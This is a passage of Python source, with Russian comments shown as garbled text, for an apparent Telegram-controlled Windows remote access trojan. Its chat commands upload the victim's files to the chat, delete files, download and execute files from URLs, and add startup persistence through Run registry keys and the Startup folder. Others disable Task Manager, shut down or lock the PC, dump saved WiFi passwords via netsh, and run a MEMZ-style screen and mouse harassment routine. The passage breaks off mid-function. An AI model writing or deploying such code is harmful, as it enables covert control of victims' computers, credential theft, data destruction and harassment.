    """Uploads a file to the Telegram chat."""
    # –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∑–∞–≥—Ä—É–∂–µ–Ω
    file_path = message.text.split(' ', 1)[-1]  # –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –∏–∑ —Ç–µ–∫—Å—Ç–∞ –∫–æ–º–∞–Ω–¥—ã

    if not os.path.exists(file_path):
        bot.send_message(message.chat.id, "‚ùå File not found!")
        return

    try:
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –≤ Telegram
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file)

        bot.send_message(message.chat.id, f"‚úÖ File `{os.path.basename(file_path)}` uploaded successfully!")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error uploading file: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!delete'))
def handle_delete(message):
    """–£–¥–∞–ª—è–µ—Ç —Ñ–∞–π–ª –ø–æ –ø—É—Ç–∏, —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –≤ —Å–æ–æ–±—â–µ–Ω–∏–∏."""
    # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –∏–∑ —Ç–µ–∫—Å—Ç–∞ —Å–æ–æ–±—â–µ–Ω–∏—è
    file_path = message.text.split(' ', 1)[-1]

    if not file_path or not os.path.exists(file_path):
        bot.send_message(message.chat.id, "‚ùå File not found!")
        return

    try:
        os.remove(file_path)
        bot.send_message(message.chat.id, f"‚úÖ File {file_path} deleted successfully.")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error deleting file: {e}")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞
def execute_file(file_path):
    try:
        subprocess.run([file_path], check=True)
    except Exception as e:
        return f"‚ùå Error executing file: {e}"
    return f"‚úÖ Executed file: {file_path}"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞
def download_file(url, path):
    try:
        response = requests.get(url, stream=True)
        with open(path, 'wb') as file:
            file.write(response.content)
        return f"‚úÖ File downloaded to {path}"
    except Exception as e:
        return f"‚ùå Error downloading file: {e}"

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã execute
@bot.message_handler(func=lambda message: message.text.startswith('!execute'))
def handle_execute(message):
    """–í—ã–ø–æ–ª–Ω—è–µ—Ç —Ñ–∞–π–ª –ø–æ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –ø—É—Ç–∏."""
    file_path = message.text.split(' ', 1)[-1]
    if not file_path or not os.path.exists(file_path):
        bot.send_message(message.chat.id, "‚ùå File not found!")
        return
    result = execute_file(file_path)
    bot.send_message(message.chat.id, result)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã download
@bot.message_handler(func=lambda message: message.text.startswith('!download'))
def handle_download(message):
    """–°–∫–∞—á–∏–≤–∞–µ—Ç —Ñ–∞–π–ª –ø–æ URL –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤ —É–∫–∞–∑–∞–Ω–Ω—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é."""
    try:
        url, path = message.text.split(' ', 2)[1], message.text.split(' ', 2)[2]
        result = download_file(url, path)
        bot.send_message(message.chat.id, result)
    except ValueError:
        bot.send_message(message.chat.id, "‚ùå Invalid format! Use !download <url> <path>")


# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ç–µ–∫—É—â–µ–≥–æ –ø—É—Ç–∏ –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
user_paths = {}

# –§—É–Ω–∫—Ü–∏—è –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏–∏ –ø—É—Ç–∏
def normalize_path(path):
    return path.replace("\\", "/")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã !disk
@bot.message_handler(func=lambda message: message.text.startswith('!disk'))
def handle_disk_command(message):
    user_id = message.from_user.id  # –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    if user_id not in user_paths:
        user_paths[user_id] = os.getcwd()  # –ò–∑–Ω–∞—á–∞–ª—å–Ω–æ –ø—É—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - —ç—Ç–æ —Ç–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è

    # –ü–æ–ª—É—á–∞–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥—ã
    args = message.text[6:].strip()

    if args:
        # –ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞–Ω –ø—É—Ç—å, –ø—Ä–æ–±—É–µ–º –ø–µ—Ä–µ–π—Ç–∏ –∫ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É
        new_path = args
        if os.path.isdir(new_path):
            user_paths[user_id] = new_path  # –û–±–Ω–æ–≤–ª—è–µ–º –ø—É—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            response = f"üîπ Current path updated to: `{normalize_path(new_path)}`"
        else:
            response = f"‚ùå Path `{normalize_path(new_path)}` not found"
    else:
        response = f"‚ùå No path provided."

    try:
        current_path = user_paths[user_id]  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø—É—Ç—å, —Å–≤—è–∑–∞–Ω–Ω—ã–π —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
        items = os.listdir(current_path)  # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –∏ –ø–∞–ø–æ–∫
        folders = [d for d in items if os.path.isdir(os.path.join(current_path, d))]  # –§–∏–ª—å—Ç—Ä—É–µ–º –ø–∞–ø–∫–∏
        files = [f for f in items if os.path.isfile(os.path.join(current_path, f))]  # –§–∏–ª—å—Ç—Ä—É–µ–º —Ñ–∞–π–ª—ã

        response += f"\nüìÇ **Data in {normalize_path(current_path)}**:\n"

        if folders:
            response += "\nüìÅ **Folders:**\n" + "\n".join(f"üîπ `{normalize_path(os.path.join(current_path, folder))}`" for folder in folders)
        else:
            response += "\n‚ùå No folders."

        if files:
            response += "\n\nüìÑ **Files:**\n" + "\n".join(f"üìú `{normalize_path(os.path.join(current_path, file))}`" for file in files)
        else:
            response += "\n\n‚ùå No files."

        bot.send_message(message.chat.id, response)

    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error: {e}")

# –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø—É—Ç—å –∫ –ø—Ä–æ–≥—Ä–∞–º–º–µ
PROGRAM_PATH = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

# –ú–µ—Ç–æ–¥—ã –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞
AUTOSTART_METHODS = {
    "user": (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    "machine": (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    "wow6432node": (winreg.HKEY_LOCAL_MACHINE, r"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
    "startup_folder": os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
}

def set_autoload(name: str, method: str, enable: bool):
    """–î–æ–±–∞–≤–ª—è–µ—Ç –∏–ª–∏ —É–¥–∞–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—É –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ —Ä–∞–∑–Ω—ã–º–∏ –º–µ—Ç–æ–¥–∞–º–∏"""
    if method not in AUTOSTART_METHODS:
        return "‚ùì **Methods:** `user`, `machine`, `wow6432node`, `startup_folder`"

    if method == "startup_folder":
        shortcut_path = os.path.join(AUTOSTART_METHODS[method], f"{name}.lnk")
        if enable:
            try:
                shell = Dispatch("WScript.Shell")
                shortcut = shell.CreateShortcut(shortcut_path)
                shortcut.TargetPath = PROGRAM_PATH
                shortcut.WorkingDirectory = os.path.dirname(PROGRAM_PATH)
                shortcut.Save()

                return f"‚úÖ **Added startup `{method}`!**"
            except Exception as e:
                return f"üî¥ **Error:** `{e}`"
        else:
            try:
                if os.path.exists(shortcut_path):
                    os.remove(shortcut_path)
                return f"‚ùå **Removed Startup `{method}`!**"
            except Exception as e:
                return f"üî¥ **Error:** `{e}`"

    else:
        hive, key = AUTOSTART_METHODS[method]
        try:
            with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE if enable else winreg.KEY_ALL_ACCESS) as reg_key:
                if enable:
                    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, PROGRAM_PATH)
                else:
                    winreg.DeleteValue(reg_key, name)
        except FileNotFoundError:
            pass  # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –∫–ª—é—á —É–∂–µ —É–¥–∞–ª–µ–Ω
        except Exception as e:
            return f"üî¥ **Error:** `{e}`"

        return f"‚úÖ **Added Startup `{method}`!**" if enable else f"‚ùå **Removed Startup `{method}`!"


@bot.message_handler(func=lambda message: message.text.startswith('!autoload'))
def handle_autoload(message):
    args = message.text.split()
    
    if len(args) != 4:
        bot.reply_to(message, "‚ö†Ô∏è **Incorrect** usage. Example: `!autoload <name> <method> <on/off>`\n"
                              "**Methods:** `user`, `machine`, `wow6432node`, `startup_folder`")
        return

    name, method, mode = args[1], args[2], args[3].lower()

    if mode == "on":
        result = set_autoload(name, method, True)
    elif mode == "off":
        result = set_autoload(name, method, False)
    else:
        bot.reply_to(message, "‚ö†Ô∏è **Use `<on/off>`!**")
        return

    bot.reply_to(message, result)

@bot.message_handler(func=lambda message: message.text.startswith('!shutdown'))
def shutdown(message):
    """–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö."""
    bot.reply_to(message, "üí§ Shutdown...")
    os.system("shutdown /s /t 0")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !restart
@bot.message_handler(func=lambda message: message.text.startswith('!restart'))
def restart(message):
    """–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö."""
    bot.reply_to(message, "üí´ Restarting...")
    os.system("shutdown /r /t 0")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !lock
@bot.message_handler(func=lambda message: message.text.startswith('!lock'))
def lock(message):
    """–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —ç–∫—Ä–∞–Ω."""
    bot.reply_to(message, "üîí Locked screen...")
    ctypes.windll.user32.LockWorkStation()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !lockmgr
@bot.message_handler(func=lambda message: message.text.startswith('!lockmgr'))
def lockmgr(message):
    """–û—Ç–∫–ª—é—á–∏—Ç—å –∏–ª–∏ –≤–∫–ª—é—á–∏—Ç—å Task Manager."""
    if message.chat.id != AUTHORIZED_CHANNEL_ID:
        return bot.reply_to(message, "‚ùå Unauthorized channel!")

    state = message.text.split()[1] if len(message.text.split()) > 1 else ''
    if state not in ['on', 'off']:
        return bot.reply_to(message, "‚ö†Ô∏è **Usage:** !lockmgr <on/off>")

    try:
        command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f" if state == "on" else "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f"
        subprocess.run(command, shell=True)
        bot.reply_to(message, f"‚úÖ Task Manager {'disabled' if state == 'on' else 'enabled'}.")
    except Exception as e:
        bot.reply_to(message, f"‚ùå ERROR: {e}")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è/–≤—ã–∫–ª—é—á–µ–Ω–∏—è –∑–≤—É–∫–∞
def mute_system_sound(mute=True):
    device_id = 0  # –û–±—ã—á–Ω–æ –æ—Å–Ω–æ–≤–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤—ã–≤–æ–¥–∞
    mute_flag = 1 if mute else 0
    try:
        ctypes.windll.winmm.waveOutSetVolume(device_id, mute_flag * 0xFFFF)
        return True
    except Exception as e:
        return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –∑–≤—É–∫–∞
def is_sound_muted():
    try:
        volume = ctypes.c_uint()
        ctypes.windll.winmm.waveOutGetVolume(0, ctypes.byref(volume))
        return volume.value == 0
    except Exception as e:
        return None

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !unlocksound
@bot.message_handler(func=lambda message: message.text.startswith('!unlocksound'))
def unlocksound(message):
    muted = is_sound_muted()
    if muted is None:
        bot.reply_to(message, "‚ùå Can't find sound info")
    elif muted:
        if mute_system_sound(False):
            bot.reply_to(message, "üîä Unlocked sound!")
        else:
            bot.reply_to(message, "‚ùå Can't unblock sound")
    else:
        bot.reply_to(message, "‚úÖ Sound is already enabled")


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !microlist
@bot.message_handler(func=lambda message: message.text.startswith('!Microlist'))
def microlist(message):
    """List available microphones, removing duplicates and irrelevant names."""
    p = pyaudio.PyAudio()

    # Get a list of all available microphones
    mic_list = []
    for i in range(p.get_device_count()):
        info = p.get_device_info_by_index(i)
        if info.get('maxInputChannels') > 0:
            mic_name = info.get('name')

            # Filter out invalid or corrupted names
            if is_valid_microphone_name(mic_name):
                mic_list.append(mic_name)

    # Remove duplicates by converting the list to a set and back to a list
    unique_mic_list = list(set(mic_list))

    if unique_mic_list:
        # Format the output message with a header and list of microphones
        formatted_mic_list = "\n".join(unique_mic_list)
        bot.reply_to(message, f"üé§ Available microphones:\n{formatted_mic_list}")
    else:
        bot.reply_to(message, "No valid microphones found.")

def is_valid_microphone_name(name):
    """Filters out invalid or corrupted microphone names."""
    # List of invalid keywords that might indicate corrupted names
    invalid_keywords = [
        "–†—ü–†¬µ–°–Ç–†–Ü–†—ë–°‚Ä°–†–Ö–°‚Äπ–†‚Ññ", "–†“ë–°–Ç–†¬∞–†‚Ññ–†–Ü–†¬µ–°–Ç", "–†¬∑–†¬∞–†—ó–†—ë–°–É–†—ë", "–†¬∑–†–Ü–°—ì–†—î–†¬∞", 
        "–†—ü–†¬µ–°–Ç–†¬µ–ù", "Input", "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ", "System", "Default", "Unknown"
    ]

    # Check if any invalid keyword is in the name (case insensitive)
    for keyword in invalid_keywords:
        if keyword.lower() in name.lower():
            return False
    return True

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !ping
@bot.message_handler(func=lambda message: message.text.startswith('!ping'))
def ping(message):
    site = message.text.split()[1] if len(message.text.split()) > 1 else ""
    if not site:
        bot.reply_to(message, "‚ùå Please provide a site, e.g. !ping google.com")
        return

    try:
        result = subprocess.run(["ping", "-n", "4", site], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        bot.reply_to(message, f"```{output[:1900]}```")
    except Exception as e:
        bot.reply_to(message, f"‚ùåError: {e}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !packet
@bot.message_handler(func=lambda message: message.text.startswith('!packet'))
def packet(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "‚ùå **Incorrect!** Try: `!packet <site> <packets> <strength>`\n\n**True:**\n`!packet google.com 10 64`\n`!packet 8.8.8.8 5 128`")
            return
        
        site = parts[1]
        packets = int(parts[2])
        strength = int(parts[3])

        result = subprocess.run(["ping", "-n", str(packets), "-l", str(strength), site], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        
        sent_packets = len(re.findall(r'–û—Ç–≤–µ—Ç –æ—Ç', output))
        lost_packets = len(re.findall(r'–ü—Ä–µ–≤—ã—à–µ–Ω –∏–Ω—Ç–µ—Ä–≤–∞–ª –æ–∂–∏–¥–∞–Ω–∏—è', output))
        
        detailed_output = (
            f"üì° **Ping results for {site}:**\n"
            f"üîπ **Sent Packets:** {sent_packets} / {packets}\n"
            f"‚ùå **Lost Packets:** {lost_packets}\n"
            f"üí• **Packet Strength:** {strength} bytes\n"
            f"üìä **Full Output:**\n```{output[:1500]}```"
        )
        bot.reply_to(message, detailed_output)
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "‚úÖ Packets sent, but response timeout expired.")
    except Exception as e:
        bot.reply_to(message, f"‚ùå Error: {e}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !netinfo
@bot.message_handler(func=lambda message: message.text.startswith('!netinfo'))
def netinfo(message):
    try:
        local_ip_output = subprocess.run("ipconfig | findstr IPv4", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        public_ip_output = subprocess.run("nslookup myip.opendns.com resolver1.opendns.com", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        netstat_output = subprocess.run("netstat -ano", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        dns_cache_output = subprocess.run("ipconfig /displaydns", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout

        local_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', local_ip_output)
        public_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', public_ip_output)
        netstat_lines = netstat_output.splitlines()[:10]  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞
        dns_cache_lines = dns_cache_output.splitlines()[:10]  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞

        output = (
            f"Local IPs:\n" + "\n".join(local_ips) +
            f"\n\nPublic IPs:\n" + "\n".join(public_ips) +
            f"\n\nConnections:\n" + "\n".join(netstat_lines) +
            f"\n\nLast DNS connections:\n" + "\n".join(dns_cache_lines)
        )

        bot.reply_to(message, f"```{output[:1900]}```")
    except Exception as e:
        bot.reply_to(message, f"–û—à–∏–±–∫–∞: {e}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã !wifipass
@bot.message_handler(func=lambda message: message.text.startswith('!wifipass'))
def wifipass(message):
    try:
        password_info = ""

        # –ú–µ—Ç–æ–¥ 1: Netsh
        try:
            result = subprocess.run("chcp 65001 & netsh wlan show profiles", shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore")
            profiles = re.findall(r"–í—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\s*:\s*(.+)", result.stdout)
            
            if profiles:
                for profile in profiles:
                    profile = profile.strip()
                    profile_info = subprocess.run(f'chcp 65001 & netsh wlan show profile name="{profile}" key=clear', shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore").stdout
                    password_match = re.search(r"–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–ª—é—á–∞\s*:\s*(.+)", profile_info)
                    password = password_match.group(1).strip() if password_match else "üîí –ù–µ—Ç –ø–∞—Ä–æ–ª—è"
                    password_info += f"üõú {profile}\nüîì {password}\n\n"
        except Exception as e:
            password_info += f"‚ö† –û—à–∏–±–∫–∞ netsh: {e}\n\n"

        # –ú–µ—Ç–æ–¥ 2: –ß—Ç–µ–Ω–∏–µ –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞ (–µ—Å–ª–∏ –≤–æ–∑–º–æ–∂–Ω–æ)
        try:
            key_path = r"SOFTWARE\Microsoft\WlanSvc\Interfaces"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    iface_name = winreg.EnumKey(key, i)
                    subkey_path = f"{key_path}\\{iface_name}\\Profiles"
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path) as subkey:
                            for j in range(winreg.QueryInfoKey(subkey)[0]):
                                wifi_name = winreg.EnumKey(subkey, j)
                                password_info += f"üõú {wifi_name} (–∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞)\nüîì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ\n\n"
                    except FileNotFoundError:
                        pass
        except Exception as e:
            password_info += f"‚ö† –û—à–∏–±–∫–∞ —Ä–µ–µ—Å—Ç—Ä–∞: {e}\n\n"

        # –ú–µ—Ç–æ–¥ 3: PowerShell (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±)
        try:
            powershell_script = "(netsh wlan show profile) | ForEach-Object {$_ -match '–í—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\\s*:\\s*(.+)' | Out-Null; $matches[1] }"
            result = subprocess.run(["powershell", "-Command", powershell_script], capture_output=True, text=True)
            profiles_ps = result.stdout.strip().split("\n")
            for profile in profiles_ps:
                profile = profile.strip()
                if profile:
                    profile_info = subprocess.run(["powershell", "-Command", f"netsh wlan show profile name='{profile}' key=clear"], capture_output=True, text=True)
                    password_match = re.search(r"–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–ª—é—á–∞\s*:\s*(.+)", profile_info.stdout)
                    password = password_match.group(1).strip() if password_match else "üîí –ù–µ—Ç –ø–∞—Ä–æ–ª—è"
                    password_info += f"üõú {profile} (PowerShell)\nüîì {password}\n\n"
        except Exception as e:
            password_info += f"‚ö† –û—à–∏–±–∫–∞ PowerShell: {e}\n\n"

        # –ü—Ä–æ–≤–µ—Ä–∫–∞, –µ—Å—Ç—å –ª–∏ –ø–∞—Ä–æ–ª–∏
        if not password_info.strip():
            bot.reply_to(message, "‚ùå No saved WIFI found.")
            return

        bot.reply_to(message, f"üîë WiFi Passwords:\n\n{password_info.strip()}")

    except Exception as e:
        bot.reply_to(message, f"‚ùå ERROR: {e}")

@bot.message_handler(commands=['wallpaper'])
def set_wallpaper(message):
    """–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –æ–±–æ–∏ –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª –ø–æ URL."""
    try:
        # –ü–æ–ª—É—á–∞–µ–º URL –∏–∑ —Å–æ–æ–±—â–µ–Ω–∏—è
        url = message.text.split()[1] if len(message.text.split()) > 1 else None
        if not url:
            bot.reply_to(message, "‚ùå Please provide a URL!")
            return

        path = os.path.join(os.getenv("TEMP"), "wallpaper.bmp")  # Windows –ø—Ä–∏–Ω–∏–º–∞–µ—Ç BMP

        # –ó–∞–≥—Ä—É–∂–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            bot.reply_to(message, "‚ùå Error when getting image!")
            return

        img = Image.open(io.BytesIO(response.content))

        # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ BMP, –µ—Å–ª–∏ —Ñ–æ—Ä–º–∞—Ç –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é
        img = img.convert("RGB")
        img.save(path, "BMP")

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–∫ –æ–±–æ–∏
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        bot.reply_to(message, "‚úÖ Wallpaper changed!")

    except Exception as e:
        bot.reply_to(message, f"‚ùå Error: {e}")

#-memz

effects_running = False

# Chaotic mouse movement
def move_mouse():
    while effects_running:
        x, y = pyautogui.position()
        pyautogui.moveTo(x + random.randint(-50, 50), y + random.randint(-50, 50), duration=0.1)
        time.sleep(0.1)

# Random error messages
def error_spam():
    while effects_running:
        ctypes.windll.user32.MessageBoxW(0, "MEMZ ERROR!", "Critical Error", 0x10)
        time.sleep(random.uniform(2, 5))

# Fullscreen screen distortion using screenshots
def glitch_screen():
    pygame.init()
    screen = pygame.display.set_mode(pyautogui.size(), pygame.NOFRAME)
    while effects_running:
        img = pyautogui.screenshot()
        img = img.resize(pyautogui.size())
        img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        img = cv2.applyColorMap(img, cv2.COLORMAP_JET)  # Color distortion
        img = pygame.image.frombuffer(img.tobytes(), pyautogui.size(), "RGB")
        screen.blit(img, (random.randint(-20, 20), random.randint(-20, 20)))
        pygame.display.update()
        pygame.event.pump()  # Fix for pygame freezing
        time.sleep(0.1)
    pygame.quit()

# Floating Windows icons following the cursor
def floating_icons():
    icons = [
        "C:\\Windows\\System32\\shell32.dll,128",
        "C:\\Windows\\System32\\shell32.dll,237",
        "C:\\Windows\\System32\\shell32.dll,50"
    ]
    while effects_running:
        x, y = pyautogui.position()
        icon = random.choice(icons)
        os.system(f"powershell Start-Process 'explorer.exe' -ArgumentList '/select,{icon}'")
        time.sleep(1)

# Keyboard listener to stop effects when M+Z is pressed
def key_listener(ctx):
    global effects_running
    while effects_running:
        if keyboard.is_pressed("m") and keyboard.is_pressed("z"):
            effects_running = False
            bot.loop.call_soon_threadsafe(asyncio.create_task, ctx.send("üîì Break Code `M+Z` Pressed! Stopped the MEMZ"))
            break
        time.sleep(0.1)

# MEMZ command to start/stop effects
@bot.message_handler(func=lambda message: message.text.startswith("!memz"))
def memz_command(message):
    global effects_running
    mode = message.text.split()[1] if len(message.text.split()) > 1 else None
    if mode == "on" and not effects_running:
        effects_running = True
        bot.reply_to(message, "‚úÖ MEMZ enabled!")
        threading.Thread(target=move_mouse, daemon=True).start()
        threading.Thread(target=error_spam, daemon=True).start()
        threading.Thread(target=glitch_screen, daemon=True).start()
        threading.Thread(target=floating_icons, daemon=True).start()
        threading.Thread(target=key_listener, args=(message,), daemon=True).start()
    elif mode == "off" and effects_running:
        effects_running = False
        bot.reply_to(message, "‚öôÔ∏è MEMZ Disabled üîÑ")
    else:
        bot.reply_to(message, "‚ö†Ô∏è Use !memz **on/off**")

#-memz

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤
async def enable_color_invert():
    try:
        # –í–∫–ª—é—á–∞–µ–º –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ü–≤–µ—Ç–æ–≤ —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä
        subprocess.run([
            'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\ColorFilters',
            '/v', 'Enable', '/t', 'REG_DWORD', '/d', '1', '/f'
        ], check=True)
        subprocess.run([
            'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\ColorFilters',
            '/v', 'Filter', '/t', 'REG_DWORD', '/d', '1', '/f'
        ], check=True)

        # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–æ–¥–Ω–∏–∫ Windows, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤—Å—Ç—É–ø–∏–ª–∏ –≤ —Å–∏–ª—É
        subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], check=True)
        subprocess.run(['start', 'explorer.exe'], check=True)

        return "‚úÖ –¶–≤–µ—Ç–æ–≤–æ–π —Ñ–∏–ª—å—Ç—Ä –≤–∫–ª—é—á–µ–Ω –∏ —ç–∫—Ä–∞–Ω –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω."
    except subprocess.CalledProcessError as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ü–≤–µ—Ç–æ–≤–æ–≥–æ —Ñ–∏–ª—å—Ç—Ä–∞: {e}"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤
async def disable_color_invert():
    try:
        # –û—Ç–∫–ª—é—á–∞–µ–º –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ü–≤–µ—Ç–æ–≤
        subprocess.run([
            'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\ColorFilters',
